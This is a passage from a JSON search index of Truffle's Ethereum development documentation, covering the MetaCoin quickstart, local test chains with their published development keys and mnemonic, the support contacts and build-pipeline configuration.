"docs/tezos/truffle/reference/configuring-tezos-projects/#mocha", "text": "Configuration options for the MochaJS testing framework. This configuration expects an object as detailed in Mocha's documentation . Example: mocha : { useColors : true }", "title": "mocha"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#plugins", "text": "Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Provides Truffle with a list of installed third-party extensions installed as NPM package dependencies. Truffle plugin support is currently limited to plugins that define custom workflow commands. For more information, see Third-Party Plugin Commands .", "title": "plugins"}, {"location": "docs/truffle/", "text": "What is Truffle? \u00b6 A world class development environment, testing framework and asset pipeline for blockchains using the Ethereum Virtual Machine (EVM), aiming to make life as a developer easier. With Truffle, you get: Built-in smart contract compilation, linking, deployment and binary management. Advanced debugging with breakpoints, variable analysis, and step functionality. Use console.log in your smart contracts Deployments and transactions through MetaMask with Truffle Dashboard to protect your mnemonic. External script runner that executes scripts within a Truffle environment. Interactive console for direct contract communication. Automated contract testing for rapid development. Scriptable, extensible deployment & migrations framework. Network management for deploying to any number of public & private networks. Package management with NPM, using the ERC190 standard. Configurable build pipeline with support for tight integration.", "title": "What is Truffle?"}, {"location": "docs/truffle/#what-is-truffle", "text": "A world class development environment, testing framework and asset pipeline for blockchains using the Ethereum Virtual Machine (EVM), aiming to make life as a developer easier. With Truffle, you get: Built-in smart contract compilation, linking, deployment and binary management. Advanced debugging with breakpoints, variable analysis, and step functionality. Use console.log in your smart contracts Deployments and transactions through MetaMask with Truffle Dashboard to protect your mnemonic. External script runner that executes scripts within a Truffle environment. Interactive console for direct contract communication. Automated contract testing for rapid development. Scriptable, extensible deployment & migrations framework. Network management for deploying to any number of public & private networks. Package management with NPM, using the ERC190 standard. Configurable build pipeline with support for tight integration.", "title": "What is Truffle?"}, {"location": "docs/truffle/contact-the-developers/", "text": "Contact the developers \u00b6 Open a Support Ticket! Looking for more 1 on 1 guidance on the current issue? Feel free to contact our support team by opening a new ticket. We're happy to help! Open a Support Ticket GitHub Discussion \u00b6 If you\u2019re having trouble, want to ask a question, or have a suggestion for Truffle, our community is a great place to post. Connect on GitHub Discussion and chat with your fellow Trufflers and developers. The answer may be just a quick search away. Issue tracker \u00b6 If you find a bug or want to recommend a new feature, the best way to reach us is by raising an issue on the GitHub project pages for Truffle , Ganache , or Drizzle . If you're using another one of our tools or libraries, you may want to check out our full list of GitHub projects to be sure you're raising your issue in the best place. Twitter \u00b6 If you want to reach out to give us some feedback you can always tweet at us ! SIGN UP FOR THE TRUFFLE MAILING LIST Sign up today to be a member of the Truffle mailing list. You'll be added to our low volume mailing list which we'll use to communicate future changes, development ideas and allow you to shape Truffle's development. hbspt.forms.create({ portalId: \"4795067\", formId: \"d18995c8-32bb-4b2d-bde9-3f49fb3d2837\" });", "title": "Support"}, {"location": "docs/truffle/contact-the-developers/#contact-the-developers", "text": "", "title": "Contact the developers"}, {"location": "docs/truffle/contact-the-developers/#github-discussion", "text": "If you\u2019re having trouble, want to ask a question, or have a suggestion for Truffle, our community is a great place to post. Connect on GitHub Discussion and chat with your fellow Trufflers and developers. The answer may be just a quick search away.", "title": "GitHub Discussion"}, {"location": "docs/truffle/contact-the-developers/#issue-tracker", "text": "If you find a bug or want to recommend a new feature, the best way to reach us is by raising an issue on the GitHub project pages for Truffle , Ganache , or Drizzle . If you're using another one of our tools or libraries, you may want to check out our full list of GitHub projects to be sure you're raising your issue in the best place.", "title": "Issue tracker"}, {"location": "docs/truffle/contact-the-developers/#twitter", "text": "If you want to reach out to give us some feedback you can always tweet at us !", "title": "Twitter"}, {"location": "docs/truffle/quickstart/", "text": "Truffle quickstart \u00b6 This page will take you through the basics of creating a Truffle project and deploying a smart contract to a blockchain. Note : Before you begin, ensure that you've read the official Ethereum documentation . Install Truffle \u00b6 Before you can use Truffle, install it using the npm command. Refer to the installation instructions to install Truffle. Create a project \u00b6 You need to run most Truffle commands against an existing Truffle project. So the first step is to create a Truffle project. You can create a bare project without smart contracts using truffle init , but for those getting started, you can use Truffle Boxes , which are example applications and project templates. We'll use the MetaCoin box , which creates a token that can be transferred between accounts. Note that this is not ERC-20 compatible. Download (\"unbox\") the MetaCoin box: truffle unbox metacoin [ PATH/TO/DIRECTORY ] Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle.js : Truffle configuration file Explore the project \u00b6 Note : This page is just a quickstart, so we're not going to go into much detail here. We'll be going over building a truffle project from the command line. All of these commands can be executed through our VS Code extension as well! Open the contracts/MetaCoin.sol file in a text editor. This is a smart contract (written in Solidity) that creates a MetaCoin token. Note that this also references another Solidity file contracts/ConvertLib.sol in the same directory. Open the migrations/1_deploy_contracts.js file. This file is the migration (deployment) script. Open the test/TestMetaCoin.sol file. This is a test file written in Solidity which ensures that your contract is working as expected. Open the test/metacoin.js file. This is a test file written in JavaScript which performs a similar function to the Solidity test above. The box does not include one, but Truffle tests can also be written in typescript. Open the truffle-config.js file. This is the Truffle configuration file , for setting network information and other project-related settings. The file is blank, but this is okay, as we'll be using a Truffle command that has some defaults built-in. Test \u00b6 To run all tests, you can simply run truffle test . Because development is commented out in truffle-config.js , truffle test will spin up and tear down a local test instance ( ganache ). If you want to use more of ganache's features , you can spin up a separate instance and specify the port number in the truffle-config . TestMetaCoin \u2714 testInitialBalanceUsingDeployedContract \u2714 testInitialBalanceWithNewMetaCoin Contract: MetaCoin \u2714 should put 10000 MetaCoin in the first account \u2714 should call a function that depends on a linked library \u2714 should send coin correctly ( 52ms ) You can also run each test individually by calling truffle test ./test/TestMetaCoin.sol and truffle test ./test/metacoin.js . Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . These two tests were run against the contract, with descriptions displayed on what the tests are supposed to do. If you're running into any issues, try out our Truffle debugger ! Compile \u00b6 If you want to only compile, you can simply run truffle compile . You will see the following output: Compiling your contracts... =========================== > Compiling ./contracts/ConvertLib.sol > Compiling ./contracts/MetaCoin.sol > Artifacts written to /Users/emilylin/dev/metacoin-box/build/contracts > Compiled successfully using: - solc: 0 .8.13+commit.abaa5c0e.Emscripten.clang Migrate with Truffle Develop \u00b6 Note : To use a separate Ganache instance, please skip to the next section. To deploy our smart contracts, we're going to need to connect to a blockchain. Truffle has a built-in personal blockchain that can be used for testing. This blockchain is local to your system and does not interact with the main Ethereum network. You can create this blockchain and interact with it using Truffle Develop . Run Truffle Develop: truffle develop You will see the following information: Truffle Develop started at http://127.0.0.1:9545/ Accounts: (0) 0x627306090abab3a6e1400e9345bc60c78a8bef57 (1) 0xf17f52151ebef6c7334fad080c5704d77216b732 (2) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef (3) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544 (4) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2 (5) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e (6) 0x2191ef87e392377ec08e7c08eb105ef5448eced5 (7) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5 (8) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc (9) 0x5aeda56215b167893e80b4fe645ba6d5bab767de Private Keys: (0) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 (1) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f (2) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1 (3) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c (4) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418 (5) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63 (6) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8 (7) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7 (8) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4 (9) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5 Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(development)> This shows ten accounts (and their private keys) that can be used when interacting with the blockchain. On the Truffle Develop prompt, Truffle commands can be run by omitting the truffle prefix. For example, to run truffle compile on the prompt, type compile . The command to deploy your compiled contracts to the blockchain is truffle migrate . By default, truffle migrate will also run truffle compile , so you can just do the following: migrate You will see the following output: Starting migrations... ====================== > Network name: 'develop' > Network id: 4447 > Block gas limit: 6721975 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3fd222279dad48583a3320decd0a2d12e82e728ba9a0f19bdaaff98c72a030a2 > Blocks: 0 Seconds: 0 > contract address: 0xa0AdaB6E829C818d50c75F17CFCc2e15bfd55a63 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.99445076 > gas used: 277462 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00554924 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00554924 ETH 2_deploy_contracts.js ===================== Deploying 'ConvertLib' ---------------------- > transaction hash: 0x97e8168f1c05fc40dd8ffc529b9a2bf45cc7c55b07b6b9a5a22173235ee247b6 > Blocks: 0 Seconds: 0 > contract address: 0xfb39FeaeF3ac3fd46e2123768e559BCe6bD638d6 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.9914458 > gas used: 108240 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.0021648 ETH Linking ------- * Contract: MetaCoin <--> Library: ConvertLib (at address: 0xfb39FeaeF3ac3fd46e2123768e559BCe6bD638d6) Deploying 'MetaCoin' -------------------- > transaction hash: 0xee4994097c10e7314cc83adf899d67f51f22e08b920e95b6d3f75c5eb498bde4 > Blocks: 0 Seconds: 0 > contract address: 0x6891Ac4E2EF3dA9bc88C96fEDbC9eA4d6D88F768 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.98449716 > gas used: 347432 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00694864 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00911344 ETH Summary ======= > Total deployments: 3 > Final cost: 0.01466268 ETH This shows the transaction IDs and addresses of your deployed contracts. It also includes a cost summary and real-time status updates. Note : Your transaction hashes, contract addresses, and accounts will be different from the above. Note : To see how to interact with the contract, please skip to the next section. Migrate with Truffle Console \u00b6 While Truffle Develop is an all-in-one personal blockchain and console, it spins up a very basic instance of ganache. You can also use a desktop application , to launch your personal blockchain, which is an easier to understand tool for those new to Ethereum and the blockchain, as it displays much more information up-front. Alternatively, if you want to customize your ganache instance using all the options available to you through the ganache CLI The only extra step, aside from running Ganache, is that it requires editing the Truffle configuration file to point to the Ganache instance. Open truffle-config.js in a text editor. Replace the content with the following, ensuring your port number is correct: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" } } }; This will allow a connection using Ganache's default connection parameters. Save and close that file. On the terminal, migrate the contract to the blockchain created by Ganache: truffle migrate You will see the following output: ```shell Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'development' > Network id: 1661545227029 > Block gas limit: 30000000 (0x1c9c380) 1_deploy_contracts.js ===================== Deploying 'ConvertLib' ---------------------- > transaction hash: 0x259332521763056a5b949d33e3f52bff424c357b56af939ca46f96baa4386729 > Blocks: 0 Seconds: 0 > contract address: 0x7c31fB61DC4b817A7AFF135382FC85bcc9078f5e > block number: 1 > block timestamp: 1661545283 > account: 0x0BD3Ea7C1CDE97e91e83615D7F6eF8910b3d0FEB > balance: 999.999468208 > gas used: 157568 (0x26780) > gas price: 3.375 gwei > value sent: 0 ETH > total cost: 0.000531792 ETH Linking ------- * Contract: MetaCoin <--> Library: ConvertLib (at address: 0x7c31fB61DC4b817A7AFF135382FC85bcc9078f5e) Deploying 'MetaCoin' -------------------- > transaction hash: 0x86b381fa96891e619a60a75db681d8aa95648b53572acc02690c9b94c76eadae > Blocks: 0 Seconds: 0 > contract address: 0x03709DE4e1a3dA52505345Bd5129b48Ac891d63B > block number: 2 > block timestamp: 1661545283 > account: 0x0BD3Ea7C1CDE97e91e83615D7F6eF8910b3d0FEB > balance: 999.998107289579739204 > gas used: 416594 (0x65b52) > gas price: 3.266773934 gwei > value sent: 0 ETH > total cost: 0.001360918420260796 ETH > Saving artifacts ------------------------------------- > Total cost: 0.001892710420260796 ETH Summary ======= > Total deployments: 2 > Final cost: 0.001892710420260796 ETH ``` This shows the transaction IDs and addresses of your deployed contracts. It also includes a cost summary and real-time status updates. Note : Your transaction IDs and contract addresses may be different from the above. To interact with the contract, you can use the Truffle console. The Truffle console is similar to Truffle Develop, except it connects to an existing blockchain (in this case, the one generated by Ganache). truffle console You will see the following prompt: truffle(development)> Interact with the contract \u00b6 Interact with the contract using the console in the following ways: Note : We're using web3.eth.getAccounts() in these examples, which returns a promise which resolves to an array of all the accounts generated by the mnemonic. So, given the addresses generated by our mnemonic above, specifying (await web3.eth.getAccounts())[0] is equivalent to the address 0x627306090abab3a6e1400e9345bc60c78a8bef57 . As of Truffle v5, the console supports async/await functions, enabling much simpler interactions with the contract. Begin by establishing both the deployed MetaCoin contract instance and the accounts created by either Truffle's built-in blockchain or Ganache: truffle ( development ) > let instance = await MetaCoin . deployed () truffle ( development ) > let accounts = await web3 . eth . getAccounts () Check the metacoin balance of the account that deployed the contract: truffle ( development ) > let balance = await instance . getBalance ( accounts [ 0 ]) truffle ( development ) > balance . toNumber () See how much ether that balance is worth (and note that the contract defines a metacoin to be worth 2 ether): truffle ( development ) > let ether = await instance . getBalanceInEth ( accounts [ 0 ]) truffle ( development ) > ether . toNumber () Transfer some metacoin from one account to another: truffle ( development ) > instance . sendCoin ( accounts [ 1 ], 500 ) Check the balance of the account that received the metacoin: truffle ( development ) > let received = await instance . getBalance ( accounts [ 1 ]) truffle ( development ) > received . toNumber () Check the balance of the account that sent the metacoin: truffle ( development ) > let newBalance = await instance . getBalance ( accounts [ 0 ]) truffle ( development ) > newBalance . toNumber () Deploy to Mainnet, Testnet, and Beyond \u00b6 If you want to deploy to alternative networks, consider using Truffle Dashboard . Just call truffle dashboard and deploy, test, and run the console using --network dashboard . Continue learning \u00b6 This quickstart showed you the basics of the Truffle project lifecycle, but there is much more to learn. Please continue on with the rest of our documentation and check out our unleashed series for the latest tutorials and interviews with industry experts!", "title": "Quickstart"}, {"location": "docs/truffle/quickstart/#truffle-quickstart", "text": "This page will take you through the basics of creating a Truffle project and deploying a smart contract to a blockchain. Note : Before you begin, ensure that you've read the official Ethereum documentation .", "title": "Truffle quickstart"}, {"location": "docs/truffle/quickstart/#install-truffle", "text": "Before you can use Truffle, install it using the npm command. Refer to the installation instructions to install Truffle.", "title": "Install Truffle"}, {"location": "docs/truffle/quickstart/#create-a-project", "text": "You need to run most Truffle commands against an existing Truffle project. So the first step is to create a Truffle project. You can create a bare project without smart contracts using truffle init , but for those getting started, you can use Truffle Boxes , which are example applications and project templates. We'll use the MetaCoin box , which creates a token that can be transferred between accounts. Note that this is not ERC-20 compatible. Download (\"unbox\") the MetaCoin box: truffle unbox metacoin [ PATH/TO/DIRECTORY ] Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle.js : Truffle configuration file", "title": "Create a project"}, {"location": "docs/truffle/quickstart/#explore-the-project", "text": "Note : This page is just a quickstart, so we're not going to go into much detail here. We'll be going over building a truffle project from the command line. All of these commands can be executed through our VS Code extension as well! Open the contracts/MetaCoin.sol file in a text editor. This is a smart contract (written in Solidity) that creates a MetaCoin token. Note that this also references another Solidity file contracts/ConvertLib.sol in the same directory. Open the migrations/1_deploy_contracts.js file. This file is the migration (deployment) script. Open the test/TestMetaCoin.sol file. This is a test file written in Solidity which ensures that your contract is working as expected. Open the test/metacoin.js file. This is a test file written in JavaScript which performs a similar function to the Solidity test above. The box does not include one, but Truffle tests can also be written in typescript. Open the truffle-config.js file. This is the Truffle configuration file , for setting network information and other project-related settings. The file is blank, but this is okay, as we'll be using a Truffle command that has some defaults built-in.", "title": "Explore the project"}, {"location": "docs/truffle/quickstart/#test", "text": "To run all tests, you can simply run truffle test . Because development is commented out in truffle-config.js , truffle test will spin up and tear down a local test instance ( ganache ). If you want to use more of ganache's features , you can spin up a separate instance and specify the port number in the truffle-config . TestMetaCoin \u2714 testInitialBalanceUsingDeployedContract \u2714 testInitialBalanceWithNewMetaCoin Contract: MetaCoin \u2714 should put 10000 MetaCoin in the first account \u2714 should call a function that depends on a linked library \u2714 should send coin correctly ( 52ms ) You can also run each test individually by calling truffle test ./test/TestMetaCoin.sol and truffle test ./test/metacoin.js . Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . These two tests were run against the contract, with descriptions displayed on what the tests are supposed to do. If you're running into any issues, try out our Truffle debugger !", "title": "Test"}, {"location": "docs/truffle/quickstart/#compile", "text": "If you want to only compile, you can simply run truffle compile . You will see the following output: Compiling your contracts... =========================== > Compiling ./contracts/ConvertLib.sol > Compiling ./contracts/MetaCoin.sol > Artifacts written to /Users/emilylin/dev/metacoin-box/build/contracts > Compiled successfully using: - solc: 0 .8.13+commit.abaa5c0e.Emscripten.clang", "title": "Compile"}, {"location": "docs/truffle/quickstart/#migrate-with-truffle-develop", "text": "Note : To use a separate Ganache instance, please skip to the next section. To deploy our smart contracts, we're going to need to connect to a blockchain. Truffle has a built-in personal blockchain that can be used for testing. This blockchain is local to your system and does not interact with the main Ethereum network. You can create this blockchain and interact with it using Truffle Develop . Run Truffle Develop: truffle develop You will see the following information: Truffle Develop started at http://127.0.0.1:9545/ Accounts: (0) 0x627306090abab3a6e1400e9345bc60c78a8bef57 (1) 0xf17f52151ebef6c7334fad080c5704d77216b732 (2) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef (3) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544 (4) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2 (5) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e (6) 0x2191ef87e392377ec08e7c08eb105ef5448eced5 (7) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5 (8) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc (9) 0x5aeda56215b167893e80b4fe645ba6d5bab767de Private Keys: (0) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 (1) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f (2) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1 (3) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c (4) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418 (5) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63 (6) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8 (7) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7 (8) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4 (9) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5 Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(development)> This shows ten accounts (and their private keys) that can be used when interacting with the blockchain. On the Truffle Develop prompt, Truffle commands can be run by omitting the truffle prefix. For example, to run truffle compile on the prompt, type compile . The command to deploy your compiled contracts to the blockchain is truffle migrate . By default, truffle migrate will also run truffle compile , so you can just do the following: migrate You will see the following output: Starting migrations... ====================== > Network name: 'develop' > Network id: 4447 > Block gas limit: 6721975 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3fd222279dad48583a3320decd0a2d12e82e728ba9a0f19bdaaff98c72a030a2 > Blocks: 0 Seconds: 0 > contract address: 0xa0AdaB6E829C818d50c75F17CFCc2e15bfd55a63 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.99445076 > gas used: 277462 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00554924 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00554924 ETH 2_deploy_contracts.js ===================== Deploying 'ConvertLib' ---------------------- > transaction hash: 0x97e8168f1c05fc40dd8ffc529b9a2bf45cc7c55b07b6b9a5a22173235ee247b6 > Blocks: 0 Seconds: 0 > contract address: 0xfb39FeaeF3ac3fd46e2123768e559BCe6bD638d6 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.9914458 > gas used: 108240 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.0021648 ETH Linking ------- * Contract: MetaCoin <--> Library: ConvertLib (at address: 0xfb39FeaeF3ac3fd46e2123768e559BCe6bD638d6) Deploying 'MetaCoin' -------------------- > transaction hash: 0xee4994097c10e7314cc83adf899d67f51f22e08b920e95b6d3f75c5eb498bde4 > Blocks: 0 Seconds: 0 > contract address: 0x6891Ac4E2EF3dA9bc88C96fEDbC9eA4d6D88F768 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.98449716 > gas used: 347432 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00694864 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00911344 ETH Summary ======= > Total deployments: 3 > Final cost: 0.01466268 ETH This shows the transaction IDs and addresses of your deployed contracts. It also includes a cost summary and real-time status updates. Note : Your transaction hashes, contract addresses, and accounts will be different from the above. Note : To see how to interact with the contract, please skip to the next section.", "title": "Migrate with Truffle Develop"}, {"location": "docs/truffle/quickstart/#migrate-with-truffle-console", "text": "While Truffle Develop is an all-in-one personal blockchain and console, it spins up a very basic instance of ganache. You can also use a desktop application , to launch your personal blockchain, which is an easier to understand tool for those new to Ethereum and the blockchain, as it displays much more information up-front. Alternatively, if you want to customize your ganache instance using all the options available to you through the ganache CLI The only extra step, aside from running Ganache, is that it requires editing the Truffle configuration file to point to the Ganache instance. Open truffle-config.js in a text editor. Replace the content with the following, ensuring your port number is correct: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" } } }; This will allow a connection using Ganache's default connection parameters. Save and close that file. On the terminal, migrate the contract to the blockchain created by Ganache: truffle migrate You will see the following output: ```shell Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'development' > Network id: 1661545227029 > Block gas limit: 30000000 (0x1c9c380) 1_deploy_contracts.js ===================== Deploying 'ConvertLib' ---------------------- > transaction hash: 0x259332521763056a5b949d33e3f52bff424c357b56af939ca46f96baa4386729 > Blocks: 0 Seconds: 0 > contract address: 0x7c31fB61DC4b817A7AFF135382FC85bcc9078f5e > block number: 1 > block timestamp: 1661545283 > account: 0x0BD3Ea7C1CDE97e91e83615D7F6eF8910b3d0FEB > balance: 999.999468208 > gas used: 157568 (0x26780) > gas price: 3.375 gwei > value sent: 0 ETH > total cost: 0.000531792 ETH Linking ------- * Contract: MetaCoin <--> Library: ConvertLib (at address: 0x7c31fB61DC4b817A7AFF135382FC85bcc9078f5e) Deploying 'MetaCoin' -------------------- > transaction hash: 0x86b381fa96891e619a60a75db681d8aa95648b53572acc02690c9b94c76eadae > Blocks: 0 Seconds: 0 > contract address: 0x03709DE4e1a3dA52505345Bd5129b48Ac891d63B > block number: 2 > block timestamp: 1661545283 > account: 0x0BD3Ea7C1CDE97e91e83615D7F6eF8910b3d0FEB > balance: 999.998107289579739204 > gas used: 416594 (0x65b52) > gas price: 3.266773934 gwei > value sent: 0 ETH > total cost: 0.001360918420260796 ETH > Saving artifacts ------------------------------------- > Total cost: 0.001892710420260796 ETH Summary ======= > Total deployments: 2 > Final cost: 0.001892710420260796 ETH ``` This shows the transaction IDs and addresses of your deployed contracts. It also includes a cost summary and real-time status updates. Note : Your transaction IDs and contract addresses may be different from the above. To interact with the contract, you can use the Truffle console. The Truffle console is similar to Truffle Develop, except it connects to an existing blockchain (in this case, the one generated by Ganache). truffle console You will see the following prompt: truffle(development)>", "title": "Migrate with Truffle Console"}, {"location": "docs/truffle/quickstart/#interact-with-the-contract", "text": "Interact with the contract using the console in the following ways: Note : We're using web3.eth.getAccounts() in these examples, which returns a promise which resolves to an array of all the accounts generated by the mnemonic. So, given the addresses generated by our mnemonic above, specifying (await web3.eth.getAccounts())[0] is equivalent to the address 0x627306090abab3a6e1400e9345bc60c78a8bef57 . As of Truffle v5, the console supports async/await functions, enabling much simpler interactions with the contract. Begin by establishing both the deployed MetaCoin contract instance and the accounts created by either Truffle's built-in blockchain or Ganache: truffle ( development ) > let instance = await MetaCoin . deployed () truffle ( development ) > let accounts = await web3 . eth . getAccounts () Check the metacoin balance of the account that deployed the contract: truffle ( development ) > let balance = await instance . getBalance ( accounts [ 0 ]) truffle ( development ) > balance . toNumber () See how much ether that balance is worth (and note that the contract defines a metacoin to be worth 2 ether): truffle ( development ) > let ether = await instance . getBalanceInEth ( accounts [ 0 ]) truffle ( development ) > ether . toNumber () Transfer some metacoin from one account to another: truffle ( development ) > instance . sendCoin ( accounts [ 1 ], 500 ) Check the balance of the account that received the metacoin: truffle ( development ) > let received = await instance . getBalance ( accounts [ 1 ]) truffle ( development ) > received . toNumber () Check the balance of the account that sent the metacoin: truffle ( development ) > let newBalance = await instance . getBalance ( accounts [ 0 ]) truffle ( development ) > newBalance . toNumber ()", "title": "Interact with the contract"}, {"location": "docs/truffle/quickstart/#deploy-to-mainnet-testnet-and-beyond", "text": "If you want to deploy to alternative networks, consider using Truffle Dashboard . Just call truffle dashboard and deploy, test, and run the console using --network dashboard .", "title": "Deploy to Mainnet, Testnet, and Beyond"}, {"location": "docs/truffle/quickstart/#continue-learning", "text": "This quickstart showed you the basics of the Truffle project lifecycle, but there is much more to learn. Please continue on with the rest of our documentation and check out our unleashed series for the latest tutorials and interviews with industry experts!", "title": "Continue learning"}, {"location": "docs/truffle/concepts/build-processes/", "text": "Build process \u00b6 Warning : The build command and this approach is being deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. In order to provide tight integration with Truffle for those that desire it, Truffle allows you to specify a custom build pipeline meant to bootstrap and configure your application. Truffle provides three methods of integration, described below. Run an external command \u00b6 If you'd like Truffle to run an external command whenever it triggers a build, simply include that option as a string within your project configuration, like so: module . exports = { // This will run the `webpack` command on each build. // // The following environment variables will be set when running the command: // WORKING_DIRECTORY: root location of the project // BUILD_DESTINATION_DIRECTORY: expected destination of built assets (important for `truffle serve`) // BUILD_CONTRACTS_DIRECTORY: root location of your build contract files (.sol.js) // build : \"webpack\" } Note that you're given ample environment variables with which to integrate with Truffle, detailed above. Provide a custom function \u00b6 You can also provide a custom build function like the one below. Note you're given a plethora of information about your project which you can use to integrate tightly with Truffle. module . exports = { build : function ( options , callback ) { // Do something when a build is required. `options` contains these values: // // working_directory: root location of the project // contracts_directory: root directory of .sol files // destination_directory: directory where truffle expects the built assets (important for `truffle serve`) } } Create a custom module \u00b6 You could also create a module or object that implements the builder interface (i.e., is an object which contains a build function like the one above). This is great for those who want to maintain tighter integration with Truffle and publish a package to make everyone else's lives easier. Here's an example using Truffle's default builder: var DefaultBuilder = require ( \"truffle-default-builder\" ); module . exports = { build : new DefaultBuilder (...) // specify the default builder configuration here. } Bootstrap your application \u00b6 Whether you're building an application to run in the browser, or a command line tool, a Javascript library or a native mobile application, bootstrapping your contracts is the same, and using your deployed contract artifacts follows the same general process no matter the app you're building. When configuring your build tool or application, you'll need to perform the following steps: 1) Get all your contract artifacts into your build pipeline / application. This includes all of the .json files within the ./build/contracts directory. 2) Turn those .json contract artifacts into contract abstractions that are easy to use, via @truffle/contract . 3) Provision those contract abstractions with a Web3 provider. In the browser, this provider might come from Metamask or Mist (DEPRECATED) , but it could also be a custom provider you've configured to point to Infura or any other Ethereum client. 4) Use your contracts! In Node, this is very easy to do. Let's take a look at an example that shows off the \"purest\" way of performing the above steps, since it exists outside of any build process or tool. // Step 1: Get a contract into my application var json = require ( \"./build/contracts/MyContract.json\" ); // Step 2: Turn that contract into an abstraction I can use var contract = require ( \"@truffle/contract\" ); var MyContract = contract ( json ); // Step 3: Provision the contract with a web3 provider MyContract . setProvider ( new Web3 . providers . HttpProvider ( \"http://127.0.0.1:8545\" )); // Step 4: Use the contract! MyContract . deployed (). then ( function ( deployed ) { return deployed . someFunction (); }); All build processes and contract bootstrapping will follow this pattern. The key when setting up your own custom build process is to ensure you're consuming all of your contract artifacts and provisioning your abstractions correctly.", "title": "Build process"}, {"location": "docs/truffle/concepts/build-processes/#build-process", "text": "Warning : The build command and this approach is being deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. In order to provide tight integration with Truffle for those that desire it, Truffle allows you to specify a custom build pipeline meant to bootstrap and configure your application. Truffle provides three methods of integration, described below.", "title": "Build process"}, {"location": "docs/truffle/concepts/build-processes/#run-an-external-command", "text": "If you'd like Truffle to run an external command whenever it triggers a build, simply include that option as a string within your project configuration, like so: module . exports = { // This will run the `webpack` command on each build. // // The following environment variables will be set when running the command: // WORKING_DIRECTORY: root location of the project // BUILD_DESTINATION_DIRECTORY: expected destination of built assets (important for `truffle serve`) // BUILD_CONTRACTS_DIRECTORY: root location of your build contract files (.sol.js) // build : \"webpack\" } Note that you're given ample environment variables 